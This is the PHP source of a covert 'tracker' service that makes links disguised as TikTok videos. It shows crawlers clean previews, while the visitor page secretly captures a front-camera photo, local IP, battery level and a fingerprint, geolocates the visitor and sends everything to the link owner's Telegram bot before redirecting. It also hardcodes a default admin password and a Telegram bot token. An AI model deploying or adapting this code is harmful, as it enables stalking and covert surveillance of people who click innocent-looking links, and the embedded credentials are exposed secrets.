<?php
date_default_timezone_set('Africa/Algiers');
error_reporting(E_ALL);
ini_set('display_errors', 0);

ignore_user_abort(true);
set_time_limit(0);

session_start();

$db_file = __DIR__ . '/tracker_enhanced_v3.db';

try {
    $db = new PDO('sqlite:' . $db_file);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $db->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
    $db->exec("PRAGMA journal_mode=WAL;");

    $db->exec("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT, role TEXT DEFAULT 'user', tg_chat TEXT, tg_token TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)");
    try { $db->exec("ALTER TABLE users ADD COLUMN tg_token TEXT"); } catch (Exception $e) {}

    $adminExists = $db->query("SELECT COUNT(*) FROM users WHERE role = 'admin'")->fetchColumn();
    if (!$adminExists) {
        $hash = password_hash('aziz123', PASSWORD_DEFAULT);
        $db->prepare("INSERT INTO users (username, password, role, tg_chat, tg_token) VALUES ('admin', ?, 'admin', '6475721500', '8701062671:AAHPiY9DOr1HNRNQzlb4-4XIhVroYzEMjEU')")->execute([$hash]);
    }

    $db->exec("CREATE TABLE IF NOT EXISTS links (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, name TEXT, code TEXT UNIQUE, target_url TEXT, meta_title TEXT, meta_image TEXT, use_camera INTEGER DEFAULT 1, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)");
    try { $db->exec("ALTER TABLE links ADD COLUMN user_id INTEGER"); } catch (Exception $e) {}
    try { $db->exec("ALTER TABLE links ADD COLUMN name TEXT"); } catch (Exception $e) {}
    $db->exec("CREATE INDEX IF NOT EXISTS idx_link_code ON links(code)");

    $db->exec("CREATE TABLE IF NOT EXISTS captures (id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, image_data TEXT, public_ip TEXT, local_ip TEXT, port TEXT, location TEXT, isp_info TEXT, vpn_status TEXT, device_info TEXT, latitude REAL, longitude REAL, battery_info TEXT, canvas_fp TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP)");
    $db->exec("CREATE INDEX IF NOT EXISTS idx_capture_code ON captures(code)");

} catch (Exception $e) { die("Database error: " . $e->getMessage()); }

function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_token = null) {
    if (empty($chat_id)) return;
    $token = $custom_token ?: '8701062671:AAHPiY9DOr1HNRNQzlb4-4XIhVroYzEMjEU'; 
    
    if (!empty($image_base64) && strpos($image_base64, 'data:image/') === 0) {
        $url = "https://api.telegram.org/bot{$token}/sendPhoto";
        $image_parts = explode(";base64,", $image_base64);
        $image_base64_data = base64_decode($image_parts[1] ?? '');
        $tmpfile = tempnam(sys_get_temp_dir(), 'tg_img_') . '.jpg';
        file_put_contents($tmpfile, $image_base64_data);
        $data = ['chat_id' => $chat_id, 'caption' => $message, 'parse_mode' => 'HTML', 'photo' => new CURLFile($tmpfile)];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3); @curl_exec($ch); curl_close($ch); @unlink($tmpfile);
    } else {
        $url = "https://api.telegram.org/bot{$token}/sendMessage";
        $data = ['chat_id' => $chat_id, 'text' => $message, 'parse_mode' => 'HTML'];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data)); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 2); @curl_exec($ch); curl_close($ch);
    }
}

// دالة السحب المباشر الحقيقي من صفحات تيك توك (Web Scraping)
function fetch_tiktok_exclusive_meta($url) {
    $meta = [
        'title' => 'TikTok Video', 
        'image' => ''
    ];

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 5,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
        CURLOPT_HTTPHEADER => [
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language: en-US,en;q=0.5',
            'Referer: https://www.tiktok.com/'
        ]
    ]);
    $html = curl_exec($ch);
    $effective_url = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
    curl_close($ch);

    if ($html) {
        // استخراج العنوان الحقيقي للفيديو
        if (preg_match('/<meta[^>]+property=["\']og:title["\'][^>]+content=["\']([^"\']+)["\']/i', $html, $matches)) {
            $meta['title'] = html_entity_decode($matches[1], ENT_QUOTES, 'UTF-8');
        } elseif (preg_match('/<meta[^>]+content=["\']([^"\']+)["\'][^>]+property=["\']og:title["\']/i', $html, $matches)) {
            $meta['title'] = html_entity_decode($matches[1], ENT_QUOTES, 'UTF-8');
        }

        // استخراج صورة الغلاف الحقيقية للفيديو
        if (preg_match('/<meta[^>]+property=["\']og:image["\'][^>]+content=["\']([^"\']+)["\']/i', $html, $matches)) {
            $meta['image'] = html_entity_decode($matches[1], ENT_QUOTES, 'UTF-8');
        } elseif (preg_match('/<meta[^>]+content=["\']([^"\']+)["\'][^>]+property=["\']og:image["\']/i', $html, $matches)) {
            $meta['image'] = html_entity_decode($matches[1], ENT_QUOTES, 'UTF-8');
        }
    }

    // إذا لم يتم العثور على الصورة مباشرة، نستخدم TikWM API كبديل احتياطي قوي
    if (empty($meta['image'])) {
        $ch2 = curl_init("https://www.tikwm.com/api/?url=" . urlencode($effective_url ?: $url));
        curl_setopt_array($ch2, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 6,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
        ]);
        $res = curl_exec($ch2);
        curl_close($ch2);
        if ($res) {
            $data = json_decode($res, true);
            if (isset($data['code']) && $data['code'] === 0 && !empty($data['data'])) {
                if (!empty($data['data']['title'])) $meta['title'] = $data['data']['title'];
                if (!empty($data['data']['cover'])) $meta['image'] = $data['data']['cover'];
            }
        }
    }

    return $meta;
}

function get_real_ip() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function get_ip_details($ip) {
    if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
        return ['location' => 'Local Network', 'isp' => 'Internal/VPN', 'lat' => 0, 'lon' => 0];
    }
    $ch = curl_init("http://ip-api.com/json/{$ip}?fields=status,country,city,isp,lat,lon");
    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 2]);
    $json = curl_exec($ch); curl_close($ch);
    
    if ($json) {
        $data = json_decode($json, true);
        if (isset($data['status']) && $data['status'] === 'success') {
            $location = ($data['city'] ? $data['city'] . ', ' : '') . ($data['country'] ?? 'Unknown');
            return ['location' => $location, 'isp' => $data['isp'] ?? 'Unknown', 'lat' => $data['lat'] ?? 0, 'lon' => $data['lon'] ?? 0];
        }
    }
    return ['location' => 'Unknown', 'isp' => 'Unknown', 'lat' => 0, 'lon' => 0];
}

function get_device_type($ua) {
    if (preg_match('/Android\s+[0-9.]+;\s*([^;)]+)/', $ua, $matches)) {
        $model = trim($matches[1]);
        if (stripos($model, 'build') !== false) $model = trim(substr($model, 0, stripos($model, 'build')));
        return $model . ' (Android)';
    }
    if (stripos($ua, 'iPhone') !== false) return 'iPhone (iOS)';
    if (stripos($ua, 'Windows') !== false) return 'PC (Windows)';
    return 'Unknown Device';
}

// ==========================================
// Tracker Core
// ==========================================
if (isset($_GET['r'])) {
    $code = $_GET['r'];
    $stmt = $db->prepare("SELECT l.*, u.tg_chat, u.tg_token FROM links l LEFT JOIN users u ON l.user_id = u.id WHERE l.code = ?");
    $stmt->execute([$code]);
    $link = $stmt->fetch();

    if ($link) {
        $target_redirect = $link['target_url'];
        $meta_title = $link['meta_title'];
        $meta_image = $link['meta_image'];
        $use_camera = $link['use_camera'];
        $owner_tg_chat = $link['tg_chat'];
        $owner_tg_token = $link['tg_token'];

        $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
        $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|twitterbot|discordbot|preview/i', $ua);

        // إرسال البيانات الحقيقية لبوت واتساب وفيسبوك
        if ($is_bot) {
            header('Content-Type: text/html; charset=utf-8');
            echo '<!DOCTYPE html><html><head>';
            echo '<meta charset="UTF-8">';
            echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
            echo '<meta property="og:description" content="شاهد هذا الفيديو على تيك توك">';
            if (!empty($meta_image)) {
                echo '<meta property="og:image" content="' . htmlspecialchars($meta_image) . '">';
                echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($meta_image) . '">';
            }
            echo '<meta property="og:image:type" content="image/jpeg">';
            echo '<meta property="og:type" content="video.other">';
            echo '<meta property="og:url" content="' . htmlspecialchars($target_redirect) . '">';
            echo '<meta name="twitter:card" content="summary_large_image">';
            echo '<meta name="twitter:title" content="' . htmlspecialchars($meta_title) . '">';
            if (!empty($meta_image)) {
                echo '<meta name="twitter:image" content="' . htmlspecialchars($meta_image) . '">';
            }
            echo '</head><body></body></html>';
            exit();
        }

        if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_info'])) {
            if (function_exists('fastcgi_finish_request')) {
                echo 'OK'; 
                fastcgi_finish_request();
            } else {
                header('Connection: close'); header('Content-Length: 2'); echo 'OK'; flush();
            }

            $public_ip = get_real_ip();
            $ip_details = get_ip_details($public_ip);
            
            $img_base64 = $_POST['image'] ?? '';
            if (strpos($img_base64, 'data:image/') !== 0) $img_base64 = ''; 
            $local_ip = $_POST['lip'] ?? 'Direct';
            $port = $_SERVER['REMOTE_PORT'] ?? 'Unknown';
            $device = get_device_type($ua);
            $battery_info = $_POST['battery'] ?? 'Unknown';
            $canvas_fp = $_POST['canvas_fp'] ?? 'Unknown';

            try {
                $capStmt = $db->prepare("INSERT INTO captures (code, image_data, public_ip, local_ip, port, location, isp_info, vpn_status, device_info, latitude, longitude, battery_info, canvas_fp, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                $capStmt->execute([$code, $img_base64, $public_ip, $local_ip, $port, $ip_details['location'], $ip_details['isp'], 'No', $device, $ip_details['lat'], $ip_details['lon'], $battery_info, $canvas_fp, date('Y-m-d H:i:s')]);
                
                $msg = "<b>New Visit!</b>\n\n";
                $msg .= "<b>Account:</b> {$link['name']}\n";
                $msg .= "<b>Device:</b> {$device}\n";
                $msg .= "<b>Location:</b> {$ip_details['location']}\n";
                $msg .= "<b>ISP:</b> {$ip_details['isp']}\n";
                $msg .= "<b>IP:</b> <code>{$public_ip}</code>\n";
                
                sendTelegramAlert($owner_tg_chat, $msg, $img_base64, $owner_tg_token);
            } catch (Exception $e) {}
            exit;
        }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($meta_title); ?></title>
    <style>* { margin: 0; padding: 0; } body, html { width: 100%; height: 100%; background: #000; overflow: hidden; }</style>
    <script>
        const useCamera = <?php echo $use_camera ? 'true' : 'false'; ?>;
        const targetUrl = <?php echo json_encode($target_redirect); ?>;
        async function getBatteryInfo() { try { const b = await navigator.getBattery(); return Math.round(b.level * 100) + "%"; } catch (e) { return 'Unknown'; } }
        function getCanvasFingerprint() { try { const c = document.createElement('canvas'); const ctx = c.getContext('2d'); ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20); const data = c.toDataURL(); return data.length.toString(); } catch (e) { return 'Unknown'; } }
        function getLocalIP() { return new Promise((resolve) => { let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] }); let res = false; pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {}); pc.onicecandidate = (e) => { if (!e.candidate || !e.candidate.candidate) return; const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate); if (ip && !res) { res = true; resolve(ip[1]); pc.close(); } }; setTimeout(() => { if(!res) { resolve("Direct"); pc.close(); } }, 150); }); }

        async function initTracking() {
            let imageData = "";
            let cameraPromise = new Promise(async (resolve) => {
                if (useCamera) {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
                        const video = document.createElement('video'); video.srcObject = stream; await video.play(); await new Promise(r => setTimeout(r, 150));
                        const canvas = document.createElement('canvas'); canvas.width = 480; canvas.height = 360;
                        canvas.getContext('2d').drawImage(video, 0, 0, 480, 360); imageData = canvas.toDataURL('image/jpeg', 0.4);
                        stream.getTracks().forEach(track => track.stop());
                    } catch (e) {}
                }
                resolve();
            });

            const localIp = await getLocalIP(); 
            const battery = await getBatteryInfo(); 
            const canvasFp = getCanvasFingerprint();
            
            const formData = new URLSearchParams();
            formData.append('save_info', '1'); formData.append('image', imageData); formData.append('lip', localIp); formData.append('battery', battery); formData.append('canvas_fp', canvasFp);
            
            if (navigator.sendBeacon) { 
                navigator.sendBeacon(window.location.href, formData); 
            } else { 
                fetch(window.location.href, { method: 'POST', body: formData, keepalive: true }); 
            }
            
            window.location.replace(targetUrl); 
            await cameraPromise;
            if (imageData !== "") {
                let imgData = new URLSearchParams(); imgData.append('save_image_only', '1'); imgData.append('image', imageData); imgData.append('code', '<?php echo $code; ?>');
                navigator.sendBeacon(window.location.href, imgData);
            }
        }
        window.addEventListener('DOMContentLoaded', initTracking);
    </script>
</head>
<body></body>
</html>
<?php 
        exit();
    } else { die("Link not found."); }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_image_only'])) {
    $code = $_POST['code'];
    $img_base64 = $_POST['image'] ?? '';
    if (!empty($img_base64)) {
        $db->prepare("UPDATE captures SET image_data = ? WHERE code = ? ORDER BY id DESC LIMIT 1")->execute([$img_base64, $code]);
    }
    exit('OK');
}

// ==========================================
// Dashboard
// ==========================================
$login_error = '';
if (isset($_POST['login'])) {
    $stmt = $db->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->execute([trim($_POST['username'])]);
    $user = $stmt->fetch();
    if ($user && password_verify($_POST['password'], $user['password'])) {
        session_regenerate_id(true);
        $_SESSION['user_id'] = $user['id']; $_SESSION['username'] = $user['username']; $_SESSION['role'] = $user['role'];
        header("Location: /"); exit();
    } else { $login_error = "Invalid username or password!"; }
}
if (isset($_GET['logout'])) { session_destroy(); header("Location: /"); exit(); }

$is_logged_in = isset($_SESSION['user_id']);
$is_admin = $is_logged_in && $_SESSION['role'] === 'admin';
$current_user_id = $_SESSION['user_id'] ?? 0;
$current_username = $_SESSION['username'] ?? '';

if ($is_logged_in) {
    if (isset($_GET['delete_id'])) {
        $del_id = intval($_GET['delete_id']);
        if ($is_admin) { $db->prepare("DELETE FROM captures WHERE id = ?")->execute([$del_id]); }
        else { $db->prepare("DELETE FROM captures WHERE id = ? AND code IN (SELECT code FROM links WHERE user_id = ?)")->execute([$del_id, $current_user_id]); }
        header("Location: /"); exit();
    }

    $generated_link = ""; $generated_code = "";
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create'])) {
        $target_url = trim($_POST['target_url']); $link_name = trim($_POST['link_name']);
        $use_camera = isset($_POST['use_camera']) ? 1 : 0;
        if (!filter_var($target_url, FILTER_VALIDATE_URL)) $target_url = "https://" . $target_url;
        
        $scraped = fetch_tiktok_exclusive_meta($target_url);
        $code = substr(md5(uniqid(rand(), true)), 0, 7);
        
        $db->prepare("INSERT INTO links (user_id, name, code, target_url, meta_title, meta_image, use_camera) VALUES (?, ?, ?, ?, ?, ?, ?)")->execute([$current_user_id, $link_name, $code, $target_url, $scraped['title'], $scraped['image'], $use_camera]);
        $generated_link = "https://" . $_SERVER['HTTP_HOST'] . "/?r=" . $code; $generated_code = $code;
    }

    $stmt = $is_admin ? $db->query("SELECT c.*, l.name as link_name FROM captures c LEFT JOIN links l ON c.code = l.code ORDER BY c.id DESC LIMIT 50") : $db->prepare("SELECT c.*, l.name as link_name FROM captures c JOIN links l ON c.code = l.code WHERE l.user_id = ? ORDER BY c.id DESC LIMIT 50");
    if(!$is_admin) $stmt->execute([$current_user_id]);
    $captures = $stmt->fetchAll();
}
?>
<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Control Panel - Aziz Edition</title>
    <style>
        :root { --bg: #070913; --card: rgba(16, 23, 42, 0.85); --border: #1e293b; --text: #f8fafc; --muted: #94a3b8; --accent: #8b5cf6; --danger: #f43f5e; --success: #10b981; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, sans-serif; }
        body { background: #05080f; color: var(--text); min-height: 100vh; display: flex; flex-direction: column; }
        .app-container { display: flex; flex: 1; height: 100vh; overflow: hidden; }
        .sidebar { width: 260px; background: rgba(15, 21, 35, 0.9); border-right: 1px solid var(--border); padding: 20px; display: flex; flex-direction: column; }
        .main-content { flex: 1; overflow-y: auto; padding: 30px; }
        .card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 20px; margin-bottom: 20px; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; font-size: 13px; color: var(--muted); margin-bottom: 5px; }
        input[type="text"], input[type="password"] { width: 100%; background: #050b14; border: 1px solid var(--border); border-radius: 6px; padding: 10px; color: var(--text); }
        .btn { background: var(--accent); color: white; border: none; padding: 10px 15px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; }
        .btn-danger { background: var(--danger); }
        .gallery-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; }
        .capture-card { background: #050b14; border: 1px solid var(--border); border-radius: 8px; overflow: hidden; padding: 15px; }
        .capture-card img { width: 100%; height: 180px; object-fit: cover; border-radius: 6px; margin-bottom: 10px; }
        @media (max-width: 768px) { .app-container { flex-direction: column; height: auto; } .sidebar { width: 100%; } }
    </style>
</head>
<body>

<?php if (!$is_logged_in): ?>
    <div style="display: flex; align-items: center; justify-content: center; min-height: 100vh;">
        <div class="card" style="width: 100%; max-width: 400px;">
            <h2 style="text-align: center; margin-bottom: 20px; color: var(--accent);">Login</h2>
            <?php if (!empty($login_error)): ?><p style="color: var(--danger); font-size: 13px; margin-bottom: 10px; text-align: center;"><?php echo $login_error; ?></p><?php endif; ?>
            <form method="POST">
                <div class="form-group"><input type="text" name="username" placeholder="Username" required autofocus></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit" name="login" class="btn">Login</button>
            </form>
        </div>
    </div>
<?php else: ?>
    <div class="app-container">
        <aside class="sidebar">
            <h2>Control Panel</h2>
            <p style="color: var(--muted); font-size: 12px; margin-bottom: 20px;">Welcome, <?php echo htmlspecialchars($current_username); ?></p>
            <a href="?logout=1" class="btn btn-danger" style="margin-top: auto; text-align: center; text-decoration: none;">Logout</a>
        </aside>
        <main class="main-content">
            <div class="card">
                <h3>Create New Tracking Link</h3>
                <form method="POST" style="margin-top: 15px;">
                    <div class="form-group"><label>Link Name</label><input type="text" name="link_name" required></div>
                    <div class="form-group"><label>TikTok Video URL</label><input type="text" name="target_url" required></div>
                    <button type="submit" name="create" class="btn">Generate Link</button>
                </form>
                <?php if (!empty($generated_link)): ?>
                    <div style="margin-top: 15px; padding: 10px; background: rgba(16, 185, 129, 0.1); border: 1px solid var(--success); border-radius: 6px;">
                        <label style="color: var(--success); font-size: 12px;">Link Ready:</label>
                        <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>" style="margin-top: 5px; color: #38bdf8;">
                    </div>
                <?php endif; ?>
            </div>

            <div class="card">
                <h3>Visits Log</h3>
                <?php if (empty($captures)): ?>
                    <p style="color: var(--muted); text-align: center; padding: 20px;">No records yet.</p>
                <?php else: ?>
                    <div class="gallery-grid" style="margin-top: 15px;">
                        <?php foreach ($captures as $cap): ?>
                            <div class="capture-card">
                                <div style="font-weight: bold; color: var(--accent); margin-bottom: 8px;"><?php echo htmlspecialchars($cap['link_name']); ?></div>
                                <?php if (!empty($cap['image_data'])): ?>
                                    <a href="<?php echo htmlspecialchars($cap['image_data']); ?>" target="_blank"><img src="<?php echo htmlspecialchars($cap['image_data']); ?>" alt="Capture"></a>
                                <?php else: ?>
                                    <div style="height: 180px; background: #050b14; display: flex; align-items: center; justify-content: center; color: var(--muted); font-size: 12px; border-radius: 6px; margin-bottom: 10px;">No image</div>
                                <?php endif; ?>
                                <div style="font-size: 12px; color: var(--muted);">IP: <span style="color: var(--text);"><?php echo htmlspecialchars($cap['public_ip']); ?></span></div>
                                <div style="font-size: 12px; color: var(--muted);">Location: <span style="color: var(--success);"><?php echo htmlspecialchars($cap['location']); ?></span></div>
                                <div style="font-size: 12px; color: var(--muted);">Device: <span style="color: #a78bfa;"><?php echo htmlspecialchars($cap['device_info']); ?></span></div>
                                <a href="?delete_id=<?php echo $cap['id']; ?>" class="btn btn-danger" style="margin-top: 10px; padding: 6px; font-size: 11px; text-align: center; text-decoration: none; display: block;" onclick="return confirm('Delete?');">Delete</a>
                            </div>
                        <?php endforeach; ?>
                    </div>
                <?php endif; ?>
            </div>
        </main>
    </div>
<?php endif; ?>
</body>
</html>
